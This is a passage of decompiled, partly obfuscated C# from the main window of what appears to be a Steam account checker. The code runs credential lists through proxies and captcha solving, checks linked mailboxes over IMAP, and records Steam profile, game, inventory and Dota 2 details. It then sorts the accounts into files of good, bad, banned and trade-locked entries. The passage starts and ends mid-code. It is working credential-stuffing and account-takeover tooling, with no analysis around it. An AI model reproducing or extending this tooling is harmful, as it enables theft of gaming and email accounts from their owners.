						if (Class1.CheckBoxFindAcc)
						{
							EmailCheckColection emailCheckColection = (EmailCheckColection)thOneClass.EmailClass.GetType().InvokeMember("StartMailtFindAndCheck", BindingFlags.InvokeMethod, null, thOneClass.EmailClass, new object[]
							{
								userBase,
								Class1.emailSearchSetting_0,
								thOneClass.ProxyClient,
								false
							});
							if (emailCheckColection.AllMessageCount > 0)
							{
								list = (List<string>)thOneClass.CurentWorkClass.GetType().InvokeMember("ParseText", BindingFlags.InvokeMethod, null, thOneClass.CurentWorkClass, new object[]
								{
									emailCheckColection.MessageCollection
								});
							}
							else
							{
								lock (this)
								{
									this.method_7(emailCheckColection, thOneClass, userBase);
									continue;
								}
							}
						}
						if (list == null)
						{
							lock (this)
							{
								this.method_7(null, thOneClass, userBase);
								continue;
							}
						}
						IL_612:
						if (list.Count == 0)
						{
							EmailCheckColection emailCheckColection = new EmailCheckColection();
							if (userBase.AtachEmailStatus == AtachStatus.OK)
							{
								emailCheckColection.AtachStatus = userBase.AtachEmailStatus;
							}
							else
							{
								emailCheckColection.AtachStatus = AtachStatus.BAD;
							}
							lock (this)
							{
								this.method_7(emailCheckColection, thOneClass, userBase);
								continue;
							}
						}
						List<string> list2 = new List<string>();
						foreach (string text3 in list)
						{
							if (!string.IsNullOrEmpty(text3))
							{
								list2.Add(string.Format("{0}|{1}", userBase.user, text3));
							}
						}
						list2 = list2.Distinct<string>().ToList<string>();
						bool flag14 = false;
						try
						{
							obj = this;
							Monitor.Enter(this, ref flag14);
							foreach (string user in list2)
							{
								this.list_0.Insert(0, new UserBase(user));
							}
							this.int_0 += list2.Count - 1;
							this.int_2 += list2.Count - 1;
							Dispatcher dispatcher3 = base.Dispatcher;
							if (methodInvoker3 == null)
							{
								methodInvoker3 = new MethodInvoker(this.method_10);
							}
							dispatcher3.Invoke(methodInvoker3, new object[0]);
							continue;
						}
						finally
						{
							if (flag14)
							{
								Monitor.Exit(obj);
							}
						}
					}
					if (userBase.Dictionary.Any<KeyValuePair<string, string>>())
					{
						userBase = (UserBase)thOneClass.CurentWorkClass.GetType().InvokeMember("LogFormater", BindingFlags.InvokeMethod, null, thOneClass.CurentWorkClass, new object[]
						{
							userBase
						});
						if (string.IsNullOrEmpty(userBase.userText))
						{
							bool flag15 = false;
							try
							{
								obj = this;
								Monitor.Enter(this, ref flag15);
								this.method_6(null, null, null, userBase, thOneClass);
								continue;
							}
							finally
							{
								if (flag15)
								{
									Monitor.Exit(obj);
								}
							}
						}
						bool flag16 = false;
						try
						{
							obj = this;
							Monitor.Enter(this, ref flag16);
							this.method_6("OK", userBase.userText, userBase.otherDataString, userBase, thOneClass);
							continue;
						}
						finally
						{
							if (flag16)
							{
								Monitor.Exit(obj);
							}
						}
					}
					string text4 = null;
					string text5 = null;
					string text6 = null;
					string text7 = null;
					string text8 = null;
					string text9 = null;
					string string_ = null;
					userBase = (UserBase)thOneClass.CurentWorkClass.GetType().InvokeMember("CheckAcc", BindingFlags.InvokeMethod, null, thOneClass.CurentWorkClass, new object[]
					{
						userBase,
						Class1.smethod_23(),
						Class1.pyMtamktSp(),
						Class1.smethod_36(),
						Class1.smethod_43(),
						Class1.CheckBoxFindAccSearch,
						Class1.CheckBoxRecoveryLogins,
						Class1.CheckBoxUseAntigate,
						Class1.smethod_2(),
						Class1.list_1,
						thOneClass.ProxyClient
					});
					text4 = userBase.userText;
					if (!string.IsNullOrEmpty(text4))
					{
						if (text4.Contains("http://steamcommunity.com"))
						{
							string text10 = text4;
							if (Class1.pyMtamktSp())
							{
								text7 = (string)thOneClass.CurentWorkClass.GetType().InvokeMember("GetGamePage", BindingFlags.InvokeMethod, null, thOneClass.CurentWorkClass, new object[0]);
							}
							if (Class1.smethod_36() && !string.IsNullOrEmpty(text4))
							{
								text6 = (string)thOneClass.CurentWorkClass.GetType().InvokeMember("GetProfilePage", BindingFlags.InvokeMethod, null, thOneClass.CurentWorkClass, new object[0]);
							}
							if (Class1.smethod_43() && !string.IsNullOrEmpty(text4))
							{
								text8 = (string)thOneClass.CurentWorkClass.GetType().InvokeMember("GetInventarPage", BindingFlags.InvokeMethod, null, thOneClass.CurentWorkClass, new object[0]);
								if (text8.Contains("\"appid\":570,\"name\":\"Dota 2\"") && Class1.smethod_23())
								{
									text9 = (string)thOneClass.CurentWorkClass.GetType().InvokeMember("GetDotaPage", BindingFlags.InvokeMethod, null, thOneClass.CurentWorkClass, new object[0]);
								}
							}
							if (Class1.smethod_32() && !string.IsNullOrEmpty(text4))
							{
								string text11 = text10.Split(new char[]
								{
									'/'
								}).Last<string>();
								if (!string.IsNullOrEmpty(text11))
								{
									Type type = thOneClass.CurentWorkClass.GetType();
									string name = "CheckAccID";
									BindingFlags invokeAttr = BindingFlags.InvokeMethod;
									Binder binder = null;
									object curentWorkClass = thOneClass.CurentWorkClass;
									object[] array2 = new object[2];
									array2[0] = text11;
									text5 = (string)type.InvokeMember(name, invokeAttr, binder, curentWorkClass, array2);
								}
							}
							userBase = (UserBase)thOneClass.CurentWorkClass.GetType().InvokeMember("LogFormater", BindingFlags.InvokeMethod, null, thOneClass.CurentWorkClass, new object[]
							{
								userBase,
								text10,
								text6,
								text7,
								Class1.list_2,
								Class1.smethod_45(),
								text8,
								text9,
								text5
							});
							string_ = userBase.userText;
							if (string.IsNullOrEmpty(userBase.userText))
							{
								bool flag17 = false;
								try
								{
									obj = this;
									Monitor.Enter(this, ref flag17);
									this.method_6(null, string_, text9, userBase, thOneClass);
									continue;
								}
								finally
								{
									if (flag17)
									{
										Monitor.Exit(obj);
									}
								}
							}
							if (Class1.smethod_43() && text8.Contains("\"appid\":570,\"name\":\"Dota 2\"") && Class1.smethod_23())
							{
								text9 = (string)thOneClass.CurentWorkClass.GetType().InvokeMember("GetDotaInfo", BindingFlags.InvokeMethod, null, thOneClass.CurentWorkClass, new object[0]);
							}
							text4 = "OK";
						}
						else if (text4 == "BAD")
						{
							bool flag18 = false;
							try
							{
								obj = this;
								Monitor.Enter(this, ref flag18);
								this.method_6("BAD", string_, text9, userBase, thOneClass);
								continue;
							}
							finally
							{
								if (flag18)
								{
									Monitor.Exit(obj);
								}
							}
						}
					}
					bool flag19 = false;
					try
					{
						obj = this;
						Monitor.Enter(this, ref flag19);
						this.method_6(text4, string_, text9, userBase, thOneClass);
					}
					finally
					{
						if (flag19)
						{
							Monitor.Exit(obj);
						}
					}
					if (string.IsNullOrEmpty(text4))
					{
						Thread.Sleep(500);
					}
				}
			}
		}

		// Token: 0x06000154 RID: 340 RVA: 0x00010E58 File Offset: 0x0000F058
		private void method_6(string string_4, string string_5, string string_6, UserBase userBase_0, ThOneClass thOneClass_0)
		{
			MethodInvoker methodInvoker = null;
			MethodInvoker methodInvoker2 = null;
			Action action = null;
			bool flag = false;
			int allgamessInAcc = 0;
			bool flag2 = false;
			bool banned = false;
			bool flag3 = false;
			bool Inventar = false;
			thOneClass_0.UserBase = null;
			if (string.IsNullOrEmpty(string_4))
			{
				this.int_5++;
				if (userBase_0.user.Contains('|'))
				{
					this.list_0.Insert(0, userBase_0);
				}
				else if (userBase_0.AtachEmailStatus == AtachStatus.OK)
				{
					if (this.list_0.Count > 200)
					{
						this.list_0.Insert(this.random_0.Next(0, 100), userBase_0);
					}
					else
					{
						this.list_0.Insert(0, userBase_0);
					}
				}
				else
				{
					this.list_0.Add(userBase_0);
				}
			}
			else if (string_4 == "BAD")
			{
				this.int_1++;
				this.int_2--;
				this.int_4++;
				flag2 = true;
				thOneClass_0.ProxyRespStatus = true;
			}
			else if (string_4 == "OK")
			{
				thOneClass_0.ProxyRespStatus = true;
				if (Class1.smethod_30() && string_5.Contains("Games in Account -->>  0") && !string_5.Contains(">>>>>>>>>>Этот профиль скрыт.<<<<<<<<<<<<"))
				{
					this.int_1++;
					this.int_2--;
					this.int_4++;
					flag2 = true;
				}
				else if (Class1.smethod_38() && string_5.Contains("Trade Статус: заблокирован"))
				{
					this.int_1++;
					this.int_2--;
					this.int_4++;
					flag2 = true;
				}
				else if (Class1.smethod_40() && string_5.Contains("Профиль пользователя заблокирован"))
				{
					this.int_1++;
					this.int_2--;
					this.int_4++;
					flag2 = true;
				}
				else if (Class1.kGatfvmMh4() && string_5.Contains("Уровень игрока: -> 0"))
				{
					this.int_1++;
					this.int_2--;
					this.int_4++;
					flag2 = true;
				}
				else
				{
					this.int_1++;
					this.int_2--;
					this.int_3++;
					flag = true;
				}
			}
			else if (string_4 == "Capcha")
			{
				this.int_6++;
				if (userBase_0.user.Contains('|'))
				{
					this.list_0.Insert(0, userBase_0);
				}
				else if (userBase_0.AtachEmailStatus == AtachStatus.OK)
				{
					if (this.list_0.Count > 200)
					{
						this.list_0.Insert(this.random_0.Next(0, 100), userBase_0);
					}
					else
					{
						this.list_0.Insert(0, userBase_0);
					}
				}
				else
				{
					this.list_0.Add(userBase_0);
				}
			}
			else if (string_4 == "SteamCapcha")
			{
				this.int_11++;
				if (userBase_0.user.Contains('|'))
				{
					this.list_0.Insert(0, userBase_0);
				}
				else if (userBase_0.AtachEmailStatus == AtachStatus.OK)
				{
					if (this.list_0.Count > 200)
					{
						this.list_0.Insert(this.random_0.Next(0, 100), userBase_0);
					}
					else
					{
						this.list_0.Insert(0, userBase_0);
					}
				}
				else
				{
					this.list_0.Add(userBase_0);
				}
			}
			else if (string_4 == "SteamSearchCapcha")
			{
				this.int_12++;
				if (userBase_0.user.Contains('|'))
				{
					this.list_0.Insert(0, userBase_0);
				}
				else if (userBase_0.AtachEmailStatus == AtachStatus.OK)
				{
					if (this.list_0.Count > 200)
					{
						this.list_0.Insert(this.random_0.Next(0, 100), userBase_0);
					}
					else
					{
						this.list_0.Insert(0, userBase_0);
					}
				}
				else
				{
					this.list_0.Add(userBase_0);
				}
			}
			else if (string_4 == "XZ")
			{
				if (userBase_0.user.Contains('|'))
				{
					this.list_0.Insert(0, userBase_0);
					return;
				}
				if (userBase_0.AtachEmailStatus != AtachStatus.OK)
				{
					this.list_0.Add(userBase_0);
					return;
				}
				if (this.list_0.Count > 200)
				{
					this.list_0.Insert(this.random_0.Next(0, 100), userBase_0);
					return;
				}
				this.list_0.Insert(0, userBase_0);
				return;
			}
			else
			{
				this.int_5++;
				if (userBase_0.user.Contains('|'))
				{
					this.list_0.Insert(0, userBase_0);
				}
				else if (userBase_0.AtachEmailStatus == AtachStatus.OK)
				{
					if (this.list_0.Count > 200)
					{
						this.list_0.Insert(this.random_0.Next(0, 100), userBase_0);
					}
					else
					{
						this.list_0.Insert(0, userBase_0);
					}
				}
				else
				{
					this.list_0.Add(userBase_0);
				}
			}
			if (flag)
			{
				if (string_5.Contains("||||"))
				{
					string_5 = string_5.Replace("||||", "||");
				}
				if (string_5.Contains("Профиль пользователя заблокирован"))
				{
					banned = true;
				}
				if (string_5.Contains("Inventory Game status -->>"))
				{
					Inventar = true;
				}
				if (string_5.Contains("Trade Статус: заблокирован"))
				{
					flag3 = true;
				}
				if (string_5.Contains("\t\t"))
				{
					MatchCollection matchCollection = Regex.Matches(string_5, "\t\t(.*)");
					allgamessInAcc += matchCollection.Count;
					if (Class1.smethod_32())
					{
						allgamessInAcc--;
					}
					if (allgamessInAcc < 0)
					{
						allgamessInAcc = 0;
					}
				}
				if (string_5.Contains(">>>>>>>>>>Этот профиль скрыт.<<<<<<<<<<<<") && allgamessInAcc == 0)
				{
					allgamessInAcc = 999;
				}
				bool likeGame = false;
				foreach (string text in Class1.list_3)
				{
					if (string_5.Contains(text))
					{
						likeGame = true;
						text + "_Like.txt";
						break;
					}
				}
				base.Dispatcher.Invoke(new MethodInvoker(delegate()
				{
					this._rezLogList.Insert(0, new MainWindow.SearchRez(userBase_0.user, allgamessInAcc, Inventar, banned, likeGame));
					if (this.bool_0)
					{
						this.soundPlayer_0.Play();
					}
				}), new object[0]);
				if (!this.dictionary_0.ContainsKey(userBase_0.user))
				{
					this.dictionary_0.Add(userBase_0.user, userBase_0.user);
				}
				string text2;
				if (!string.IsNullOrEmpty(userBase_0.patchToSave))
				{
					text2 = userBase_0.patchToSave;
				}
				else if (flag3)
				{
					text2 = Class1.smethod_56();
				}
				else if (banned)
				{
					text2 = Class1.smethod_54();
				}
				else if (string_5.Contains("Games in Account -->>  0") && !string_4.Contains("Inventory Empty -->>  0") && !string_4.Contains("всего  / последний запуск"))
				{
					text2 = Class1.smethod_62();
				}
				else if (string_5.Contains("Games in Account -->>  666"))
				{
					text2 = Class1.smethod_58();
				}
				else
				{
					text2 = Class1.smethod_52();
				}
				text2 = Class1.smethod_70(string_5, text2);
				File.AppendAllText(text2, string_5 + "\r\n");
				if (!string.IsNullOrEmpty(string_6))
				{
					File.AppendAllText(Class1.smethod_60(), string_6);
				}
			}
			if (flag2)
			{
				File.AppendAllText(Class1.smethod_48(), userBase_0.user + "\r\n");
			}
			if (!flag && !flag2)
			{
				bool flag4 = (bool)this.object_0.GetType().InvokeMember("SetGoodProxy", BindingFlags.InvokeMethod, null, this.object_0, new object[]
				{
					thOneClass_0.ProxyClient,
					false
				});
			}
			else
			{
				bool flag5 = (bool)this.object_0.GetType().InvokeMember("SetGoodProxy", BindingFlags.InvokeMethod, null, this.object_0, new object[]
				{
					thOneClass_0.ProxyClient
				});
				this.int_7++;
				this.int_9++;
				if (userBase_0.AtachEmailStatus == AtachStatus.OK)
				{
					File.AppendAllText(Class1.NqftechWbJ(), userBase_0.user + "\r\n");
				}
				try
				{
					Dispatcher dispatcher = base.Dispatcher;
					if (methodInvoker == null)
					{
						methodInvoker = new MethodInvoker(this.method_11);
					}
					dispatcher.Invoke(methodInvoker, new object[0]);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				Dispatcher dispatcher2 = base.Dispatcher;
				if (methodInvoker2 == null)
				{
					methodInvoker2 = new MethodInvoker(this.method_12);
				}
				dispatcher2.Invoke(methodInvoker2, new object[0]);
			}
			catch (Exception)
			{
			}
			if (this.int_7 < 1000)
			{
				if (this.int_7 <= this.list_0.Count)
				{
					goto IL_A0A;
				}
			}
			try
			{
				string path = Class1.smethod_9();
				IEnumerable<UserBase> source = this.list_0;
				if (MainWindow.func_4 == null)
				{
					MainWindow.func_4 = new Func<UserBase, string>(MainWindow.smethod_6);
				}
				File.WriteAllLines(path, source.Select(MainWindow.func_4).ToList<string>());
				this.int_7 = 0;
			}
			catch (Exception)
			{
			}
			IL_A0A:
			if (this.int_1 == this.int_0)
			{
				Dispatcher dispatcher3 = this.buttonStop.Dispatcher;
				if (action == null)
				{
					action = new Action(this.method_13);
				}
				dispatcher3.BeginInvoke(action, new object[0]);
			}
		}

		// Token: 0x06000155 RID: 341 RVA: 0x000118DC File Offset: 0x0000FADC
		private void method_7(EmailCheckColection emailCheckColection_0, ThOneClass thOneClass_0, UserBase userBase_0)
		{
			MethodInvoker methodInvoker = null;
			MethodInvoker methodInvoker2 = null;
			Action action = null;
			bool flag = false;
			bool flag2 = false;
			bool flag3 = false;
			bool flag4 = false;
			bool flag5 = false;
			string str = null;
			thOneClass_0.UserBase = null;
			if (emailCheckColection_0 == null)
			{
				this.int_5++;
				this.list_0.Add(userBase_0);
			}
			else if (emailCheckColection_0.AtachStatus == AtachStatus.OK)
			{
				if (emailCheckColection_0.AllMessageCount == 0)
				{
					this.int_1++;
					thOneClass_0.ProxyRespStatus = true;
					this.int_2--;
					this.int_9++;
					flag = true;
					flag4 = true;
				}
				else
				{
					thOneClass_0.ProxyRespStatus = true;
					str = userBase_0.user;
					foreach (KeyValuePair<string, List<EmailMessage>> keyValuePair in emailCheckColection_0.MessageCollection)
					{
						string key = keyValuePair.Key;
						int count = keyValuePair.Value.Count;
						if (count > 0)
						{
							str += string.Format(" || {0} -> {1}", key, count);
						}
					}
					flag2 = true;
					this.int_1++;
					this.int_2--;
					this.int_4++;
					this.int_8++;
					this.int_9++;
					flag = true;
					flag4 = true;
				}
			}
			else if (emailCheckColection_0.AtachStatus == AtachStatus.Error)
			{
				this.int_5++;
				this.list_0.Add(userBase_0);
			}
			else if (emailCheckColection_0.AtachStatus == AtachStatus.BAD)
			{
				if (userBase_0.AtachEmailStatus == AtachStatus.OK && Class1.smethod_25())
				{
					this.int_5++;
					this.list_0.Add(userBase_0);
				}
				else
				{
					thOneClass_0.ProxyRespStatus = true;
					this.int_1++;
					this.int_2--;
					this.int_4++;
					flag = true;
				}
			}
			else if (emailCheckColection_0.AtachStatus == AtachStatus.Public)
			{
				this.int_1++;
				thOneClass_0.ProxyRespStatus = true;
				this.int_2--;
				this.int_10++;
				flag = true;
				flag5 = true;
			}
			else if (emailCheckColection_0.AtachStatus == AtachStatus.Captcha)
			{
				this.int_6++;
				thOneClass_0.ProxyRespStatus = true;
				this.list_0.Add(userBase_0);
			}
			else if (emailCheckColection_0.AtachStatus == AtachStatus.NoSupport)
			{
				this.int_1++;
				this.int_2--;
				this.int_4++;
				flag3 = true;
				flag = true;
			}
			else
			{
				this.int_5++;
				this.list_0.Add(userBase_0);
			}
			if (flag)
			{
				if (flag3)
				{
					File.AppendAllText(Class1.smethod_19(), userBase_0.user + "\r\n");
				}
				if (flag5)
				{
					File.AppendAllText(Class1.smethod_21(), userBase_0.user + "\r\n");
				}
				else if (flag4)
				{
					if (flag2 && emailCheckColection_0.AllMessageCount > 0)
					{
						File.AppendAllText(Class1.smethod_17(), str + "\r\n");
					}
					else
					{
						File.AppendAllText(Class1.NqftechWbJ(), userBase_0.user + "\r\n");
					}
				}
				else
				{
					File.AppendAllText(Class1.smethod_50(), userBase_0.user + "\r\n");
				}
			}
			if (flag)
			{
				this.int_7++;
				try
				{
					Dispatcher dispatcher = base.Dispatcher;
					if (methodInvoker == null)
					{
						methodInvoker = new MethodInvoker(this.method_14);
					}
					dispatcher.Invoke(methodInvoker, new object[0]);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				Dispatcher dispatcher2 = base.Dispatcher;
				if (methodInvoker2 == null)
				{
					methodInvoker2 = new MethodInvoker(this.method_15);
				}
				dispatcher2.Invoke(methodInvoker2, new object[0]);
			}
			catch (Exception)
			{
			}
			if (this.int_7 < 1000)
			{
				if (this.int_7 <= this.list_0.Count)
				{
					goto IL_41D;
				}
			}
			try
			{
				string path = Class1.smethod_9();
				IEnumerable<UserBase> source = this.list_0;
				if (MainWindow.func_5 == null)
				{
					MainWindow.func_5 = new Func<UserBase, string>(MainWindow.smethod_7);
				}
				File.WriteAllLines(path, source.Select(MainWindow.func_5).ToList<string>());
				this.int_7 = 0;
			}
			catch (Exception)
			{
			}
			IL_41D:
			if (this.int_1 == this.int_0)
			{
				Dispatcher dispatcher3 = this.buttonStop.Dispatcher;
				if (action == null)
				{
					action = new Action(this.method_16);
				}
				dispatcher3.BeginInvoke(action, new object[0]);
			}
		}

		// Token: 0x06000156 RID: 342 RVA: 0x00011D70 File Offset: 0x0000FF70
		private void LabelSettings_MouseDown(object sender, MouseButtonEventArgs e)
		{
			BruteSet bruteSet = new BruteSet();
			bruteSet.ShowDialog();
		}

		// Token: 0x06000157 RID: 343 RVA: 0x00011D8C File Offset: 0x0000FF8C
		private void LabellogViewer_MouseDoubleClick(object sender, MouseButtonEventArgs e)
		{
			LogViewer logViewer = new LogViewer();
			logViewer.ShowDialog();
		}

		// Token: 0x06000158 RID: 344 RVA: 0x00011DA8 File Offset: 0x0000FFA8
		private void CheckBoxUseImap_Click(object sender, RoutedEventArgs e)
		{
			if (this.CheckBoxUseImap.IsChecked.Value)
			{
				LoadConfig loadConfig = new LoadConfig();
				loadConfig.ShowDialog();
				if (this.CheckBoxUseImap.IsChecked.Value)
				{
					Class1.smethod_65(true);
					if (EmailConfigWorker.EmailSettingCount == 0)
					{
						System.Windows.MessageBox.Show("Не удалось загрузить внутренние настройки. \r\n Программа будет работать на автоматически сгенерированных настройках!!!!", "Ошибка получения настроек!", MessageBoxButton.OK, MessageBoxImage.Hand);
					}
				}
				else
				{
					Class1.smethod_65(false);
				}
			}
			if (this.CheckBoxFirstCheckMail.IsChecked.Value)
			{
				Class1.smethod_26(true);
				return;
			}
			Class1.smethod_26(false);
		}

		// Token: 0x06000159 RID: 345 RVA: 0x00011E38 File Offset: 0x00010038
		private void LabelLikeGames_MouseDoubleClick(object sender, MouseButtonEventArgs e)
		{
			LikeGames likeGames = new LikeGames();
			likeGames.ShowDialog();
		}

		// Token: 0x0600015C RID: 348 RVA: 0x00002C3F File Offset: 0x00000E3F
		[CompilerGenerated]
		private static void smethod_0()
		{
			WindowStart._StatusGetClass = false;
		}

		// Token: 0x0600015D RID: 349 RVA: 0x00002C47 File Offset: 0x00000E47
		[CompilerGenerated]
		private static void smethod_1()
		{
			WindowStart._StatusGetClass = true;
		}

		// Token: 0x0600015E RID: 350 RVA: 0x00002C4F File Offset: 0x00000E4F
		[CompilerGenerated]
		private static string smethod_2(UserBase userBase_0)
		{
			return userBase_0.user;
		}

		// Token: 0x0600015F RID: 351 RVA: 0x00002C4F File Offset: 0x00000E4F
		[CompilerGenerated]
		private static string smethod_3(UserBase userBase_0)
		{
			return userBase_0.user;
		}

		// Token: 0x06000160 RID: 352 RVA: 0x00002C4F File Offset: 0x00000E4F
		[CompilerGenerated]
		private static string smethod_4(UserBase userBase_0)
		{
			return userBase_0.user;
		}

		// Token: 0x06000161 RID: 353 RVA: 0x00002C4F File Offset: 0x00000E4F
		[CompilerGenerated]
		private static string smethod_5(UserBase userBase_0)
		{
			return userBase_0.user;
		}

		// Token: 0x06000162 RID: 354 RVA: 0x00002C57 File Offset: 0x00000E57
		[CompilerGenerated]
		private void method_8()
		{
			this.labelAllErrorCount.Content = string.Format("{0}/{1}", this.int_5.ToString(), this.int_12.ToString());
		}

		// Token: 0x06000163 RID: 355 RVA: 0x00002C84 File Offset: 0x00000E84
		[CompilerGenerated]
		private void method_9()
		{
			this.labelAllProxyCount.Content = (string)this.object_0.GetType().InvokeMember("AllProxyString", BindingFlags.InvokeMethod, null, this.object_0, new object[0]);
		}

		// Token: 0x06000164 RID: 356 RVA: 0x00002CBD File Offset: 0x00000EBD
		[CompilerGenerated]
		private void method_10()
		{
			this.labelRemainCount.Content = this.int_2.ToString();
			this.labelAllAccsCount.Content = this.int_0.ToString();
		}

		// Token: 0x06000165 RID: 357 RVA: 0x00012288 File Offset: 0x00010488
		[CompilerGenerated]
		private void method_11()
		{
			this.labelAllcheckCount.Content = this.int_1.ToString();
			this.labelRemainCount.Content = this.int_2.ToString();
			this.labelAllGoodCount.Content = this.int_3.ToString();
			this.labelAllBaddCount.Content = this.int_4.ToString();
			this.labelAllGoodMailCount.Content = string.Format("{0}/{1}", this.int_10.ToString(), this.int_9.ToString());
		}

		// Token: 0x06000166 RID: 358 RVA: 0x00012318 File Offset: 0x00010518
		[CompilerGenerated]
		private void method_12()
		{
			this.labelAllErrorCount.Content = string.Format("{0}/{1}", this.int_5.ToString(), this.int_12.ToString());
			this.labelCapchaErrorCount.Content = string.Format("{0}/{1}", this.int_6.ToString(), this.int_11.ToString());
		}

		// Token: 0x06000167 RID: 359 RVA: 0x00002C4F File Offset: 0x00000E4F
		[CompilerGenerated]
		private static string smethod_6(UserBase userBase_0)
		{
			return userBase_0.user;
		}

		// Token: 0x06000168 RID: 360 RVA: 0x00002CEB File Offset: 0x00000EEB
		[CompilerGenerated]
		private void method_13()
		{
			this.buttonStop_Click(null, null);
		}

		// Token: 0x06000169 RID: 361 RVA: 0x0001237C File Offset: 0x0001057C
		[CompilerGenerated]
		private void method_14()
		{
			this.labelAllcheckCount.Content = this.int_1.ToString();
			this.labelAllAccsCount.Content = this.int_0.ToString();
			this.labelNoTextCount.Content = this.int_8.ToString();
			this.labelRemainCount.Content = this.int_2.ToString();
			this.labelAllBaddCount.Content = this.int_4.ToString();
			this.labelAllGoodMailCount.Content = string.Format("{0}/{1}", this.int_10.ToString(), this.int_9.ToString());
		}

		// Token: 0x0600016A RID: 362 RVA: 0x00012318 File Offset: 0x00010518
		[CompilerGenerated]
		private void method_15()
		{
			this.labelAllErrorCount.Content = string.Format("{0}/{1}", this.int_5.ToString(), this.int_12.ToString());
			this.labelCapchaErrorCount.Content = string.Format("{0}/{1}", this.int_6.ToString(), this.int_11.ToString());
		}

		// Token: 0x0600016B RID: 363 RVA: 0x00002C4F File Offset: 0x00000E4F
		[CompilerGenerated]
		private static string smethod_7(UserBase userBase_0)
		{
			return userBase_0.user;
		}

		// Token: 0x0600016C RID: 364 RVA: 0x00002CEB File Offset: 0x00000EEB
		[CompilerGenerated]
		private void method_16()
		{
			this.buttonStop_Click(null, null);
		}

		// Token: 0x0600016D RID: 365 RVA: 0x00002CF5 File Offset: 0x00000EF5
		static MainWindow()
		{
			Class8.ah6VSoGzeNXX5();
			MainWindow.LicenseCheck = false;
			MainWindow.StartThreads = false;
			MainWindow.workClass = null;
			MainWindow._FreeGameList = new List<string>();
		}

		// Token: 0x04000111 RID: 273
		private SoundPlayer soundPlayer_0;

		// Token: 0x04000112 RID: 274
		private object object_0;

		// Token: 0x04000113 RID: 275
		public static bool LicenseCheck;

		// Token: 0x04000114 RID: 276
		public static bool StartThreads;

		// Token: 0x04000115 RID: 277
		public static object workClass;

		// Token: 0x04000116 RID: 278
		private string string_0;

		// Token: 0x04000117 RID: 279
		private bool bool_0;

		// Token: 0x04000118 RID: 280
		private bool bool_1;

		// Token: 0x04000119 RID: 281
		private System.Windows.Forms.Timer timer_0;

		// Token: 0x0400011A RID: 282
		private List<UserBase> list_0;

		// Token: 0x0400011B RID: 283
		private List<ThOneClass> list_1;

		// Token: 0x0400011C RID: 284
		private List<string> list_2;

		// Token: 0x0400011D RID: 285
		public static List<string> _FreeGameList;

		// Token: 0x0400011E RID: 286
		private Dictionary<string, string> qRwdNvjjem;

		// Token: 0x0400011F RID: 287
		public ObservableCollection<MainWindow.SearchRez> _rezLogList;

		// Token: 0x04000120 RID: 288
		private Dictionary<string, string> dictionary_0;

		// Token: 0x04000121 RID: 289
		private int int_0;

		// Token: 0x04000122 RID: 290
		private int int_1;

		// Token: 0x04000123 RID: 291
		private int int_2;

		// Token: 0x04000124 RID: 292
		private int int_3;

		// Token: 0x04000125 RID: 293
		private int int_4;

		// Token: 0x04000126 RID: 294
		private int int_5;

		// Token: 0x04000127 RID: 295
		private int int_6;

		// Token: 0x04000128 RID: 296
		private int int_7;

		// Token: 0x04000129 RID: 297
		private int int_8;

		// Token: 0x0400012A RID: 298
		private int int_9;

		// Token: 0x0400012B RID: 299
		private int int_10;

		// Token: 0x0400012C RID: 300
		private int int_11;

		// Token: 0x0400012D RID: 301
		private int int_12;

		// Token: 0x0400012E RID: 302
		private Assembly assembly_0;

		// Token: 0x0400012F RID: 303
		private string string_1;

		// Token: 0x04000130 RID: 304
		private string string_2;

		// Token: 0x04000131 RID: 305
		private string string_3;

		// Token: 0x04000132 RID: 306
		private Random random_0;

		// Token: 0x04000156 RID: 342
		[CompilerGenerated]
		private static MethodInvoker methodInvoker_0;

		// Token: 0x04000157 RID: 343
		[CompilerGenerated]
		private static MethodInvoker methodInvoker_1;

		// Token: 0x04000158 RID: 344
		[CompilerGenerated]
		private static Func<UserBase, string> func_0;

		// Token: 0x04000159 RID: 345
		[CompilerGenerated]
		private static Func<UserBase, string> func_1;

		// Token: 0x0400015A RID: 346
		[CompilerGenerated]
		private static Func<UserBase, string> func_2;

		// Token: 0x0400015B RID: 347
		[CompilerGenerated]
		private static Func<UserBase, string> func_3;

		// Token: 0x0400015C RID: 348
		[CompilerGenerated]
		private static Func<UserBase, string> func_4;

		// Token: 0x0400015D RID: 349
		[CompilerGenerated]
		private static Func<UserBase, string> func_5;

		// Token: 0x02000019 RID: 25
		public class SearchRez : INotifyPropertyChanged
		{
			// Token: 0x0600016E RID: 366 RVA: 0x00002D18 File Offset: 0x00000F18
			public SearchRez()
			{
				Class8.ah6VSoGzeNXX5();
				base..ctor();
				this.Account = "";
				this.Games = 0;
				this.Baned = false;
				this.Inventar = false;
				this.Like = false;
			}

			// Token: 0x0600016F RID: 367 RVA: 0x00002D4C File Offset: 0x00000F4C
			public SearchRez(string _account, int _gamesCount, bool _Inventar, bool _baned, bool _like)
			{
				Class8.ah6VSoGzeNXX5();
				base..ctor();
				this.Account = _account;
				this.Games = _gamesCount;
				this.Inventar = _Inventar;
				this.Baned = _baned;
				this.Like = _like;
			}

			// Token: 0x1700001D RID: 29
			// (get) Token: 0x06000170 RID: 368 RVA: 0x00002D7E File Offset: 0x00000F7E
			// (set) Token: 0x06000171 RID: 369 RVA: 0x00002D86 File Offset: 0x00000F86
			public string Account { get; set; }

			// Token: 0x1700001E RID: 30
			// (get) Token: 0x06000172 RID: 370 RVA: 0x00002D8F File Offset: 0x00000F8F
			// (set) Token: 0x06000173 RID: 371 RVA: 0x00002D97 File Offset: 0x00000F97
			public int Games { get; set; }

			// Token: 0x1700001F RID: 31
			// (get) Token: 0x06000174 RID: 372 RVA: 0x00002DA0 File Offset: 0x00000FA0
			// (set) Token: 0x06000175 RID: 373 RVA: 0x00002DA8 File Offset: 0x00000FA8
			public bool Inventar { get; set; }

			// Token: 0x17000020 RID: 32
			// (get) Token: 0x06000176 RID: 374 RVA: 0x00002DB1 File Offset: 0x00000FB1
			// (set) Token: 0x06000177 RID: 375 RVA: 0x00002DB9 File Offset: 0x00000FB9
			public bool Baned { get; set; }

			// Token: 0x17000021 RID: 33
			// (get) Token: 0x06000178 RID: 376 RVA: 0x00002DC2 File Offset: 0x00000FC2
			// (set) Token: 0x06000179 RID: 377 RVA: 0x00002DCA File Offset: 0x00000FCA
			public bool Like { get; set; }

			// Token: 0x14000001 RID: 1
			// (add) Token: 0x0600017A RID: 378 RVA: 0x00012424 File Offset: 0x00010624
			// (remove) Token: 0x0600017B RID: 379 RVA: 0x0001245C File Offset: 0x0001065C
			public event PropertyChangedEventHandler PropertyChanged
			{
